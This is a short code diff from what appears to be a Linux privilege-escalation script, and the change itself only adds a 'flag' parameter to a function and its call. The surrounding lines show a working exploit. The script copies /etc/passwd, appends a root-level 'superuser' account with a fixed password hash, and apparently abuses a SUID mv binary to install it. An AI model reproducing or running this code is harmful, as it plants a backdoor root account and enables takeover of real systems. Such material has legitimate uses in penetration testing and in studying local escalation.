@@ -735,7 +735,7 @@ def cp_priv_esc(flag, bold, green, blue, warning, endc):
 
 
 #mv_priv_esc function
-def mv_priv_esc(bold, green, blue, warning, endc):
+def mv_priv_esc(flag, bold, green, blue, warning, endc):
     shutil.copyfile('/etc/passwd', '/tmp/passwd')
     f = open('/tmp/passwd','a+')
     f.write('superuser:$1$superuse$D1NjirhAZKLO9jhBU9gyG.:0:0:root:/bin/bash\n')
@@ -1025,7 +1025,7 @@ def suid_exp(flag, bold, green, blue, fail, warning, endc):
                             #set new flag value
                             flag1 = "true"
                             #call function named mv_priv_esc
-                            mv_priv_esc(bold, green, blue, warning, endc)
+                            mv_priv_esc(flag, bold, green, blue, warning, endc)
                     elif name in suid_mody2:
                         if name == "chmod":
                             #set new flag value
